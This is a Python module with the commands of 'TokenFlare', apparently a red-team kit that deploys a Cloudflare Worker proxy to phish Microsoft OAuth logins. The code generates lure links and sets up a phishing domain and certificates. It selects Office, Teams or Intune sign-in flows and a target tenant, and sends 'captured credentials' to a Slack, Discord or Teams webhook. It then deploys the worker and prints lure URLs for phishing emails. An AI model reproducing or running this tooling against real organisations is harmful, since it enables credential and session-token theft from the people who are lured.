"""
TokenFlare Command Implementations

All command functions (init, configure, deploy, status, version)
"""

import os
import sys
import shutil
import subprocess
import configparser
from pathlib import Path
from typing import TYPE_CHECKING

from lib import (
    VERSION, OAUTH_URLS, OAUTH_DISPLAY_NAMES,
    DEFAULT_LURE_PATH, DEFAULT_LURE_PARAM
)

if TYPE_CHECKING:
    from lib.cli import TokenFlare
from .config import (
    load_toml,
    update_wrangler_var,
    update_wrangler_field,
    test_cloudflare_api
)
from .utils import (
    generate_uuids,
    generate_self_signed_cert,
    run_command,
    require_root,
    get_wrangler_command,
    defang_url
)


# Banner and version need to be imported or passed
class Commands:
    """Container for all command implementations"""

    def __init__(self, app: 'TokenFlare') -> None:
        """Initialise with app instance for access to paths and logger"""
        self.app = app
        self.logger = app.logger
        self.project_root = app.project_root
        self.certs_dir = app.certs_dir
        self.config_file = app.config_file
        self.wrangler_toml = app.wrangler_toml

    def cmd_init(self, domain: str) -> int:
        """Initialise TokenFlare project structure"""
        # Check for root (needed for binding to port 443 in deploy local)
        require_root("init")

        self.logger.info(f"Initialising TokenFlare for domain: {domain}")
        print()

        # Step 1: Check for openssl (needed for cert generation)
        print("[*] Checking dependencies...")
        if not shutil.which('openssl'):
            print("[!] openssl not found - required for certificate generation")
            print("    Install: sudo apt install openssl")
            return 1

        print("    ✓ All dependencies available")

        # Step 2: Create directories
        print("\n[*] Creating project structure...")
        self.certs_dir.mkdir(exist_ok=True)
        print(f"    ✓ Created {self.certs_dir}")

        # Step 3: Generate UUIDs
        print("\n[*] Generating 20 random UUIDs for lure links...")
        uuids = generate_uuids(20)
        self.logger.debug(f"Generated UUIDs: {uuids[:3]}...")  # Show first 3 in debug
        print(f"    ✓ Generated {len(uuids)} UUIDs")

        # Step 4: Update wrangler.toml with UUIDs and domain
        print("\n[*] Updating wrangler.toml with UUIDs and domain...")
        if self.wrangler_toml.exists():
            try:
                # Use surgical update to preserve comments
                uuid_string = ', '.join(uuids)
                update_wrangler_var(self.wrangler_toml, 'LURE_UUID', uuid_string)
                update_wrangler_var(self.wrangler_toml, 'LOCAL_PHISHING_DOMAIN', domain)
                print(f"    ✓ Updated {self.wrangler_toml}")
            except Exception as e:
                self.logger.error(f"Failed to update wrangler.toml: {e}")
                return 1
        else:
            self.logger.warning(f"wrangler.toml not found at {self.wrangler_toml}")
            print("    [!] wrangler.toml not found, skipping UUID update")

        # Step 5: Generate self-signed certificate
        print(f"\n[*] Generating self-signed certificate for {domain}...")
        cert_path = self.certs_dir / "cert.pem"
        key_path = self.certs_dir / "key.pem"

        if not generate_self_signed_cert(domain, cert_path, key_path):
            print("[!] Failed to generate certificate")
            return 1

        print(f"    ✓ Certificate: {cert_path}")
        print(f"    ✓ Private key: {key_path}")

        # Step 6: Create tokenflare.cfg.example
        print("\n[*] Creating configuration template...")
        example_config = self.project_root / "tokenflare.cfg.example"

        config_content = """# TokenFlare Configuration File
# WARNING: Contains secrets - do NOT commit to git

[cloudflare]
# Get these from CloudFlare Dashboard > My Profile > API Tokens
api_key = YOUR_CLOUDFLARE_API_KEY_HERE
account_id = YOUR_CLOUDFLARE_ACCOUNT_ID_HERE

[deployment]
# Worker name (will be <name>.<subdomain>.workers.dev)
worker_name = your-worker-name
"""

        with open(example_config, 'w') as f:
            f.write(config_content)
        print(f"    ✓ Created {example_config}")

        # Step 7: Summary
        print("\n" + "="*82)
        print("✓ Initialisation complete!")
        print("="*82)
        print("\nNext steps:")
        print(f"  1. Configure CloudFlare credentials:")
        print(f"     python3 tokenflare.py configure cf")
        print(f"  2. Configure campaign settings:")
        print(f"     python3 tokenflare.py configure campaign")
        print(f"  3. (Optional) Get Let's Encrypt cert for local testing:")
        print(f"     sudo python3 tokenflare.py configure ssl")
        print(f"  4. Deploy locally for testing:")
        print(f"     sudo python3 tokenflare.py deploy local")
        print()

        return 0

    # ============================================================
    # Campaign Configuration Helpers
    # ============================================================

    def _prompt_allowed_ips(self, current_value: str = '') -> str:
        """Prompt for allowed IP addresses (access control)"""
        print("[1/8] Allowed IP Addresses (Access Control)")
        print("     Restrict worker access to specific IPs for testing")
        print("     Leave empty to allow all IPs (production mode)")
        print("     Tip: Use your current IP for local testing before going live")
        print()
        if current_value:
            print(f"     Current: {current_value}")
        allowed_ips = input("     Enter comma-separated IPs (or empty for all): ").strip()
        print()
        return allowed_ips

    def _prompt_tenant(self, current_value: str = 'common') -> str:
        """Prompt for target tenant domain"""
        print("[2/8] Target Tenant Configuration")
        print("     Set the tenant domain for the target organization")
        print("     Use 'common' for multi-tenant or specific domain")
        tenant = input(f"     Enter tenant domain [{current_value}]: ").strip() or current_value
        print()
        return tenant

    def _prompt_oauth_url(self) -> str:
        """Prompt for OAuth URL selection"""
        print("[3/8] OAuth URL Selection")
        print("     Choose the Microsoft OAuth flow to use:")
        for i, (key, display) in enumerate(OAUTH_DISPLAY_NAMES.items(), 1):
            print(f"     {i}. {display}")
        print("     4. Custom (provide your own)")

        # Map user choice to oauth key
        choice_map = {
            '1': 'officehome',
            '2': 'teams',
            '3': 'intune'
        }

        choice = input("     Select option [1]: ").strip() or '1'
        if choice == '4':
            oauth_url = input("     Enter custom OAuth URL: ").strip()
        else:
            oauth_key = choice_map.get(choice, 'officehome')
            oauth_url = OAUTH_URLS[oauth_key]
        print()
        return oauth_url

    def _prompt_lure_config(self, current_path: str = '/verifyme',
                           current_param: str = 'uuid') -> tuple:
        """Prompt for lure path and parameter configuration"""
        # Lure path
        print("[4/8] Lure Path Configuration")
        print("     The URL path users will click (e.g., /verifyme)")
        lure_path = input(f"     Enter lure path [{current_path}]: ").strip() or current_path
        if not lure_path.startswith('/'):
            lure_path = '/' + lure_path
        print()

        # Lure parameter
        print("[5/8] Lure Parameter")
        print("     The query parameter name (e.g., ?uuid=...)")
        lure_param = input(f"     Enter parameter name [{current_param}]: ").strip() or current_param
        print()

        return lure_path, lure_param

    def _prompt_redirect_url(self, current_value: str = 'https://www.office.com') -> str:
        """Prompt for final redirect URL (after successful auth)"""
        print("[6/8] Final Redirect URL")
        print("     Where to send user after successful authentication")
        final_redir = input(f"     Enter final redirect URL [{current_value}]: ").strip() or current_value
        print()
        return final_redir

    def _prompt_unauth_redirect(self, current_value: str = 'https://www.office.com') -> str:
        """Prompt for unauthorized redirect URL (invalid lure)"""
        print("[7/8] Unauthorised Redirect URL")
        print("     Where to send user if lure URL is invalid (wrong UUID/path)")
        unauth_redir = input(f"     Enter unauthorised redirect URL [{current_value}]: ").strip() or current_value
        print()
        return unauth_redir

    def _prompt_webhook(self, current_value: str = 'https://hooks.slack.com/services/CHANGEME') -> str:
        """Prompt for webhook configuration"""
        print("[8/8] Webhook Configuration")
        print("     Webhook for receiving captured credentials")
        print("     Providers: discord, slack, teams")
        webhook_url = input(f"     Enter webhook URL [{current_value}]: ").strip() or current_value
        print()
        return webhook_url

    # ============================================================
    # Main Command Methods
    # ============================================================

    def cmd_configure_campaign(self) -> int:
        """Interactive campaign configuration"""
        print("Campaign Configuration")
        print("=" * 82)
        print()

        if not self.wrangler_toml.exists():
            print(f"[!] wrangler.toml not found at {self.wrangler_toml}")
            print("    Run 'init' command first")
            return 1

        try:
            config = load_toml(self.wrangler_toml)
            if 'vars' not in config:
                config['vars'] = {}

            # Use helper methods to gather configuration
            allowed_ips = self._prompt_allowed_ips(config['vars'].get('ALLOWED_IPS', ''))
            tenant = self._prompt_tenant(config['vars'].get('CLIENT_TENANT', 'common'))
            oauth_url = self._prompt_oauth_url()
            lure_path, lure_param = self._prompt_lure_config(
                config['vars'].get('LURE_PATH', '/verifyme'),
                config['vars'].get('LURE_PARAM', 'uuid')
            )
            final_redir = self._prompt_redirect_url(
                config['vars'].get('FINAL_REDIR', 'https://www.office.com')
            )
            unauth_redir = self._prompt_unauth_redirect(
                config['vars'].get('UNAUTH_REDIR', 'https://www.office.com')
            )
            webhook_url = self._prompt_webhook(
                config['vars'].get('WEBHOOK_URL', 'https://hooks.slack.com/services/CHANGEME')
            )

            # Save configuration using surgical updates to preserve comments
            update_wrangler_var(self.wrangler_toml, 'ALLOWED_IPS', allowed_ips)
            update_wrangler_var(self.wrangler_toml, 'CLIENT_TENANT', tenant)
            update_wrangler_var(self.wrangler_toml, 'UPSTREAM_PATH', oauth_url)
            update_wrangler_var(self.wrangler_toml, 'LURE_PATH', lure_path)
            update_wrangler_var(self.wrangler_toml, 'LURE_PARAM', lure_param)
            update_wrangler_var(self.wrangler_toml, 'FINAL_REDIR', final_redir)
            update_wrangler_var(self.wrangler_toml, 'UNAUTH_REDIR', unauth_redir)
            update_wrangler_var(self.wrangler_toml, 'WEBHOOK_URL', webhook_url)

            print("=" * 82)
            print("✓ Campaign configuration saved!")
            print("=" * 82)
            print("\nConfiguration summary:")
            print(f"  Allowed IPs:   {allowed_ips if allowed_ips else '(all)'}")
            print(f"  Tenant:        {tenant}")
            print(f"  Lure path:     {lure_path}?{lure_param}=<uuid>")
            print(f"  Final redir:   {final_redir}")
            print(f"  Unauth redir:  {unauth_redir}")
            print(f"  Webhook:       {webhook_url[:50]}...")
            print()

            return 0

        except Exception as e:
            self.logger.error(f"Failed to configure campaign: {e}")
            if self.app.verbose:
                self.logger.exception("Full traceback:")
            return 1

    def cmd_configure_cf(self) -> int:
        """Configure CloudFlare API credentials"""
        print("CloudFlare Configuration")
        print("=" * 82)
        print()

        # Load or create config
        config = configparser.ConfigParser()
        if self.config_file.exists():
            config.read(self.config_file)
            print(f"[*] Loading existing config from {self.config_file}")
        else:
            print(f"[*] Creating new config file: {self.config_file}")

        # Ensure sections exist
        if not config.has_section('cloudflare'):
            config.add_section('cloudflare')
        if not config.has_section('deployment'):
            config.add_section('deployment')

        # 1. API Key
        print("\n[1/3] CloudFlare API Key")
        print("     Get this from CloudFlare Dashboard > My Profile > API Tokens")
        current_key = config.get('cloudflare', 'api_key', fallback='')
        if current_key and current_key != 'YOUR_CLOUDFLARE_API_KEY_HERE':
            masked_key = current_key[:10] + '...' + current_key[-4:]
            api_key = input(f"     Enter API key [{masked_key}]: ").strip() or current_key
        else:
            api_key = input("     Enter API key: ").strip()

        if not api_key or api_key == 'YOUR_CLOUDFLARE_API_KEY_HERE':
            print("     [!] Invalid API key")
            return 1

        config.set('cloudflare', 'api_key', api_key)
        print()

        # 2. Account ID
        print("[2/3] CloudFlare Account ID")
        print("     Get this from CloudFlare Dashboard > Workers & Pages")
        current_account = config.get('cloudflare', 'account_id', fallback='')
        if current_account and current_account != 'YOUR_CLOUDFLARE_ACCOUNT_ID_HERE':
            account_id = input(f"     Enter account ID [{current_account}]: ").strip() or current_account
        else:
            account_id = input("     Enter account ID: ").strip()

        if not account_id or account_id == 'YOUR_CLOUDFLARE_ACCOUNT_ID_HERE':
            print("     [!] Invalid account ID")
            return 1

        config.set('cloudflare', 'account_id', account_id)
        print()

        # Test API credentials and get account subdomain
        print("[*] Testing CloudFlare API credentials...")
        success, result = test_cloudflare_api(api_key, account_id)

        if not success:
            print(f"[!] API test failed: {result}")
            print("    Please check your API key and account ID")
            return 1

        print("    ✓ API credentials valid")

        # Store account subdomain if available
        account_subdomain = result
        if account_subdomain:
            print(f"    ✓ Account subdomain: {account_subdomain}")
            config.set('cloudflare', 'account_subdomain', account_subdomain)
        else:
            print("    Note: Could not retrieve account subdomain")
            account_subdomain = '<account-subdomain>'

        print()

        # 3. Worker name
        print("[3/3] Worker Name")
        print(f"     Your worker will be deployed to: <worker-name>.{account_subdomain}.workers.dev")
        current_worker = config.get('deployment', 'worker_name', fallback='')
        if current_worker and current_worker != 'your-worker-name':
            worker_name = input(f"     Enter worker name [{current_worker}]: ").strip() or current_worker
        else:
            worker_name = input("     Enter worker name: ").strip()

        if not worker_name or worker_name == 'your-worker-name':
            print("     [!] Invalid worker name")
            return 1

        config.set('deployment', 'worker_name', worker_name)
        print()

        # Also update wrangler.toml so wrangler can use these values immediately
        update_wrangler_field(self.wrangler_toml, 'name', worker_name)
        update_wrangler_field(self.wrangler_toml, 'account_id', account_id)

        # Save config with secure permissions
        try:
            with open(self.config_file, 'w') as f:
                config.write(f)
            os.chmod(self.config_file, 0o600)

            print("=" * 82)
            print("✓ CloudFlare configuration saved!")
            print("=" * 82)
            print(f"\nConfig file: {self.config_file}")
            print(f"Permissions: 600 (owner read/write only)")
            if account_subdomain and account_subdomain != '<account-subdomain>':
                print(f"\nWorker URL: https://{worker_name}.{account_subdomain}.workers.dev")
            else:
                print(f"\nWorker URL: https://{worker_name}.<account-subdomain>.workers.dev")
                print("(Account subdomain will be determined at deploy time)")
            print()

            return 0

        except Exception as e:
            self.logger.error(f"Failed to save configuration: {e}")
            if self.app.verbose:
                self.logger.exception("Full traceback:")
            return 1

    def cmd_configure_ssl(self) -> int:
        """Configure SSL certificates"""
        print("SSL Certificate Configuration")
        print("=" * 82)
        print()

        print("Choose certificate configuration method:")
        print("  1. Use certbot (Let's Encrypt) - Recommended for production")
        print("  2. Use existing certificates (manual paths)")
        print("  3. Keep current self-signed certificate (generated by init)")
        print()

        choice = input("Select option [3]: ").strip() or '3'
        print()

        if choice == '1':
            # Certbot option
            if not shutil.which('certbot'):
                print("[!] certbot not found")
                print("\n    Install certbot:")
                print("        sudo apt install certbot")
                print()
                return 1

            print("Using certbot to generate Let's Encrypt certificate")
            print("=" * 82)
            print()
            print("Prerequisites:")
            print("  - Your VPS must have a public IP address")
            print("  - Port 80 must be open and available")
            print("  - You must have a valid domain pointing to this server")
            print()

            domain = input("Enter your domain name: ").strip()
            if not domain:
                print("[!] Domain required")
                return 1

            print(f"\n[*] Running certbot for domain: {domain}")
            print("    Follow the certbot prompts...")
            print()

            # Run certbot in certonly mode
            result = run_command([
                'certbot', 'certonly', '--standalone',
                '-d', domain,
                '--non-interactive', '--agree-tos',
                '--register-unsafely-without-email'
            ], timeout=120)

            if result and result.returncode == 0:
                # Copy certificates to certs directory
                cert_source = f"/etc/letsencrypt/live/{domain}/fullchain.pem"
                key_source = f"/etc/letsencrypt/live/{domain}/privkey.pem"
                cert_dest = self.certs_dir / "cert.pem"
                key_dest = self.certs_dir / "key.pem"

                try:
                    shutil.copy2(cert_source, cert_dest)
                    shutil.copy2(key_source, key_dest)
                    os.chmod(cert_dest, 0o600)
                    os.chmod(key_dest, 0o600)

                    print("\n" + "=" * 82)
                    print("✓ Let's Encrypt certificate configured!")
                    print("=" * 82)
                    print(f"\nCertificate: {cert_dest}")
                    print(f"Private key: {key_dest}")
                    print("\nNote: Remember to renew certificates before expiry (90 days)")
                    print()
                    return 0

                except Exception as e:
                    self.logger.error(f"Failed to copy certificates: {e}")
                    return 1
            else:
                print("[!] certbot failed")
                if result:
                    print(f"    Error: {result.stderr}")
                return 1

        elif choice == '2':
            # Manual certificate paths
            print("Manual Certificate Configuration")
            print("=" * 82)
            print()
            print("Provide paths to your existing certificate and private key files")
            print()

            cert_path = input("Enter path to certificate file (.pem or .crt): ").strip()
            key_path = input("Enter path to private key file (.pem or .key): ").strip()

            if not cert_path or not key_path:
                print("[!] Both certificate and key paths required")
                return 1

            # Verify files exist
            if not os.path.exists(cert_path):
                print(f"[!] Certificate file not found: {cert_path}")
                return 1

            if not os.path.exists(key_path):
                print(f"[!] Private key file not found: {key_path}")
                return 1

            # Copy to certs directory
            try:
                cert_dest = self.certs_dir / "cert.pem"
                key_dest = self.certs_dir / "key.pem"

                shutil.copy2(cert_path, cert_dest)
                shutil.copy2(key_path, key_dest)
                os.chmod(cert_dest, 0o600)
                os.chmod(key_dest, 0o600)

                print("\n" + "=" * 82)
                print("✓ Certificates configured!")
                print("=" * 82)
                print(f"\nCertificate: {cert_dest}")
                print(f"Private key: {key_dest}")
                print()
                return 0

            except Exception as e:
                self.logger.error(f"Failed to copy certificates: {e}")
                return 1

        elif choice == '3':
            # Keep existing self-signed certificate
            cert_path = self.certs_dir / "cert.pem"
            key_path = self.certs_dir / "key.pem"

            if not cert_path.exists() or not key_path.exists():
                print("[!] Self-signed certificate not found")
                print("    Run 'init' command first to generate certificates")
                return 1

            print("=" * 82)
            print("✓ Using existing self-signed certificate")
            print("=" * 82)
            print(f"\nCertificate: {cert_path}")
            print(f"Private key: {key_path}")
            print("\nNote: Self-signed certificates will show browser warnings")
            print("      Use certbot for production deployments")
            print()
            return 0

        else:
            print("[!] Invalid option")
            return 1

    def cmd_deploy_local(self) -> int:
        """Deploy worker locally using wrangler dev"""
        # Check for root (needed for binding to port 443)
        require_root("deploy local")

        print("Local Development Deployment")
        print("=" * 82)
        print()

        # 1. Check wrangler available
        wrangler_cmd = get_wrangler_command()
        if not wrangler_cmd:
            print("[!] Wrangler not found")
            print("    Install: npm install -g wrangler")
            print("    Or ensure npx is available")
            return 1

        # 2. Validate certificates exist
        cert_path = self.certs_dir / "cert.pem"
        key_path = self.certs_dir / "key.pem"

        if not cert_path.exists() or not key_path.exists():
            print("[!] SSL certificates not found")
            print(f"    Expected: {cert_path}")
            print("    Run: sudo python3 tokenflare.py init <domain>")
            return 1

        # 3. Validate configuration
        if not self.wrangler_toml.exists():
            print("[!] wrangler.toml not found")
            return 1

        config = load_toml(self.wrangler_toml)
        vars_section = config.get('vars', {})

        lure_uuid = vars_section.get('LURE_UUID', '')
        if not lure_uuid or 'CHANGEME' in lure_uuid:
            print("[!] UUIDs not configured")
            print("    Run: sudo python3 tokenflare.py init <domain>")
            return 1

        # 4. Display lure URLs (use defaults if not explicitly set)
        uuids = [u.strip() for u in lure_uuid.split(',')]
        lure_path = vars_section.get('LURE_PATH', DEFAULT_LURE_PATH)
        lure_param = vars_section.get('LURE_PARAM', DEFAULT_LURE_PARAM)
        local_domain = vars_section.get('LOCAL_PHISHING_DOMAIN', 'localhost')

        print("[*] Lure URLs (copy for phishing emails):")
        for uuid in uuids[:3]:
            url = f"https://{local_domain}{lure_path}?{lure_param}={uuid}"
            print(f"    {defang_url(url)}")
        if len(uuids) > 3:
            print(f"    ... and {len(uuids) - 3} more")
        print()

        # Check if certificate is self-signed (issuer == subject)
        is_self_signed = False
        result = run_command(['openssl', 'x509', '-in', str(cert_path), '-noout', '-issuer', '-subject'])
        if result and result.returncode == 0:
            lines = result.stdout.strip().split('\n')
            if len(lines) >= 2:
                issuer = lines[0].replace('issuer=', '').strip()
                subject = lines[1].replace('subject=', '').strip()
                is_self_signed = (issuer == subject)

        if is_self_signed:
            print("[!] Using self-signed certificate - browsers will show warnings")
        print("[*] Press Ctrl+C to stop")
        print()

        # 5. Build and run wrangler dev command
        cmd = wrangler_cmd + [
            'dev',
            '--ip', '0.0.0.0',
            '--port', '443',
            '--local-protocol', 'https',
            '--https-key-path', str(key_path),
            '--https-cert-path', str(cert_path)
        ]

        try:
            # Run interactively - don't capture output
            subprocess.run(cmd, cwd=self.project_root)
            return 0
        except KeyboardInterrupt:
            print("\n\n[*] Shutting down local deployment...")
            return 0

    def cmd_deploy_remote(self) -> int:
        """Deploy worker to CloudFlare"""
        print("CloudFlare Remote Deployment")
        print("=" * 82)
        print()

        # 1. Check wrangler available
        wrangler_cmd = get_wrangler_command()
        if not wrangler_cmd:
            print("[!] Wrangler not found")
            print("    Install: npm install -g wrangler")
            print("    Or ensure npx is available")
            return 1

        # 2. Load CloudFlare credentials
        if not self.config_file.exists():
            print("[!] CloudFlare not configured")
            print("    Run: python3 tokenflare.py configure cf")
            return 1

        cfg = configparser.ConfigParser()
        cfg.read(self.config_file)

        if not cfg.has_section('cloudflare'):
            print("[!] CloudFlare credentials missing")
            return 1

        api_key = cfg.get('cloudflare', 'api_key', fallback='')
        account_id = cfg.get('cloudflare', 'account_id', fallback='')
        account_subdomain = cfg.get('cloudflare', 'account_subdomain', fallback='')
        worker_name = cfg.get('deployment', 'worker_name', fallback='')

        if not api_key or not account_id:
            print("[!] CloudFlare credentials incomplete")
            return 1

        if not worker_name:
            print("[!] Worker name not configured")
            return 1

        # 3. Update wrangler.toml with account_id and name (top-level fields)
        update_wrangler_field(self.wrangler_toml, 'name', worker_name)
        update_wrangler_field(self.wrangler_toml, 'account_id', account_id)

        # 4. Set environment for wrangler
        env = os.environ.copy()
        env['CLOUDFLARE_API_TOKEN'] = api_key
        env['CLOUDFLARE_ACCOUNT_ID'] = account_id

        print(f"[*] Deploying worker '{worker_name}' to CloudFlare...")
        print()

        # 5. Run wrangler deploy
        try:
            result = subprocess.run(
                wrangler_cmd + ['deploy'],
                cwd=self.project_root,
                env=env
            )

            if result.returncode == 0:
                print()
                print("=" * 82)
                print("[+] Deployment successful!")
                print("=" * 82)

                # Show worker URL
                if account_subdomain:
                    worker_url = f"https://{worker_name}.{account_subdomain}.workers.dev"
                    print(f"\nWorker URL: {worker_url}")

                    # Show lure URLs
                    config = load_toml(self.wrangler_toml)
                    vars_section = config.get('vars', {})
                    uuids = [u.strip() for u in vars_section.get('LURE_UUID', '').split(',')]
                    lure_path = vars_section.get('LURE_PATH', DEFAULT_LURE_PATH)
                    lure_param = vars_section.get('LURE_PARAM', DEFAULT_LURE_PARAM)

                    print("\nLure URLs:")
                    for uuid in uuids[:3]:
                        url = f"{worker_url}{lure_path}?{lure_param}={uuid}"
                        print(f"  {defang_url(url)}")
                    if len(uuids) > 3:
                        print(f"  ... and {len(uuids) - 3} more")
                print()

            return result.returncode

        except Exception as e:
            self.logger.error(f"Deployment failed: {e}")
            return 1

    def cmd_status(self, get_lure_url: bool = False) -> int:
        """Show current configuration and deployment status"""
        print("TokenFlare Status")
        print("=" * 82)
        print()

        # 1. Initialisation status
        print("[*] Initialisation:")
        if self.wrangler_toml.exists():
            config = load_toml(self.wrangler_toml)
            vars_section = config.get('vars', {})
            lure_uuid = vars_section.get('LURE_UUID', '')
            has_uuids = lure_uuid and 'CHANGEME' not in lure_uuid
            uuid_count = len([u for u in lure_uuid.split(',') if u.strip()]) if lure_uuid else 0

            print("    [+] wrangler.toml found")
            print(f"    {'[+]' if has_uuids else '[-]'} UUIDs configured ({uuid_count} total)")
        else:
            print("    [-] wrangler.toml not found - run 'init' first")
            config = {}
            vars_section = {}

        # 2. Certificate status
        print("\n[*] SSL Certificates:")
        cert_path = self.certs_dir / "cert.pem"
        key_path = self.certs_dir / "key.pem"

        if cert_path.exists() and key_path.exists():
            print(f"    [+] Certificate: {cert_path}")
            print(f"    [+] Private key: {key_path}")

            # Check certificate validity and expiry with openssl
            result = run_command(['openssl', 'x509', '-in', str(cert_path), '-noout', '-checkend', '0'])
            if result:
                if result.returncode == 0:
                    print("    [+] Certificate is valid (not expired)")
                else:
                    print("    [!] Certificate has EXPIRED")

            # Get expiry date
            result = run_command(['openssl', 'x509', '-in', str(cert_path), '-noout', '-enddate'])
            if result and result.returncode == 0:
                expiry = result.stdout.strip().replace('notAfter=', '')
                print(f"    [i] Expires: {expiry}")

            # Get certificate subject (CN)
            result = run_command(['openssl', 'x509', '-in', str(cert_path), '-noout', '-subject'])
            if result and result.returncode == 0:
                subject = result.stdout.strip().replace('subject=', '').strip()
                print(f"    [i] Subject: {subject}")
        else:
            print("    [-] Certificates not found")

        # 3. CloudFlare configuration
        print("\n[*] CloudFlare:")
        worker_url = None
        if self.config_file.exists():
            cfg = configparser.ConfigParser()
            cfg.read(self.config_file)

            if cfg.has_section('cloudflare'):
                subdomain = cfg.get('cloudflare', 'account_subdomain', fallback='')
                worker_name = cfg.get('deployment', 'worker_name', fallback='')

                print("    [+] API key configured")
                if subdomain and worker_name:
                    worker_url = f"https://{worker_name}.{subdomain}.workers.dev"
                    print(f"    [+] Worker: {worker_name}.{subdomain}.workers.dev")
                else:
                    print(f"    [i] Worker name: {worker_name or 'Not set'}")
            else:
                print("    [-] Not configured - run 'configure cf'")
        else:
            print("    [-] No config file - run 'configure cf'")

        # 4. Campaign configuration
        print("\n[*] Campaign:")
        if self.wrangler_toml.exists():
            tenant = vars_section.get('CLIENT_TENANT', 'Not set')
            lure_path = vars_section.get('LURE_PATH', DEFAULT_LURE_PATH)
            final_redir = vars_section.get('FINAL_REDIR', 'Not set')
            unauth_redir = vars_section.get('UNAUTH_REDIR', 'Not set')
            webhook = vars_section.get('WEBHOOK_URL', '')
            allowed_ips = vars_section.get('ALLOWED_IPS', '')

            print(f"    Allowed IPs:  {allowed_ips if allowed_ips else '(all)'}")
            print(f"    Tenant:       {tenant}")
            print(f"    Lure path:    {lure_path}")
            print(f"    Final redir:  {final_redir}")
            print(f"    Unauth redir: {unauth_redir}")
            print(f"    Webhook:      {'Configured' if webhook and 'CHANGEME' not in webhook else 'Not configured'}")

        # 5. Lure URLs (if --get-lure-url flag is set)
        if get_lure_url and self.wrangler_toml.exists():
            lure_uuid = vars_section.get('LURE_UUID', '')
            if lure_uuid and 'CHANGEME' not in lure_uuid:
                uuids = [u.strip() for u in lure_uuid.split(',') if u.strip()]
                lure_path = vars_section.get('LURE_PATH', DEFAULT_LURE_PATH)
                lure_param = vars_section.get('LURE_PARAM', DEFAULT_LURE_PARAM)
                local_domain = vars_section.get('LOCAL_PHISHING_DOMAIN', 'localhost')

                print("\n[*] Lure URLs (Local):")
                for uuid in uuids[:5]:
                    url = f"https://{local_domain}{lure_path}?{lure_param}={uuid}"
                    print(f"    {defang_url(url)}")
                if len(uuids) > 5:
                    print(f"    ... and {len(uuids) - 5} more")

                if worker_url:
                    print("\n[*] Lure URLs (Remote):")
                    for uuid in uuids[:5]:
                        url = f"{worker_url}{lure_path}?{lure_param}={uuid}"
                        print(f"    {defang_url(url)}")
                    if len(uuids) > 5:
                        print(f"    ... and {len(uuids) - 5} more")

        print()
        return 0

    def cmd_version(self) -> int:
        """Display version information"""
        print(f"Version: {VERSION}")
        print(f"Python: {sys.version.split()[0]}")
        return 0
